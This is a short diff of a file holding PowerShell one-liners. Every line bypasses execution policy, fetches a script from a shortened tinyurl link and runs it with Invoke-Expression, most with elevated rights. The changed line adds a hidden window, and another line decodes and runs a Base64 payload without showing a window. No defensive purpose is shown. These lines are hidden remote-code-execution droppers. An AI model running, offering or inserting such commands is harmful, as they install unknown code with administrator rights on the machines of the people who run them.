@@ -1,4 +1,4 @@
-powershell.exe -Ep Bypass -C "Start-Process pwsh -ArgumentList 'iex(irm ''https://tinyurl.com/4j72ashp/'')' -Verb RunAs"
+powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList '-WindowStyle Hidden -Command \"irm 'https://tinyurl.com/4j72ashp/' | iex\"' -Verb RunAs"
 powershell.exe -ExecutionPolicy Bypass -Command "Start-Process PowerShell -ArgumentList 'irm "https://tinyurl.com/4j72ashp/" | iex' -Verb RunAs"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "(iex ( [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((irm https://tinyurl.com/4j72ashp)))) )"
 
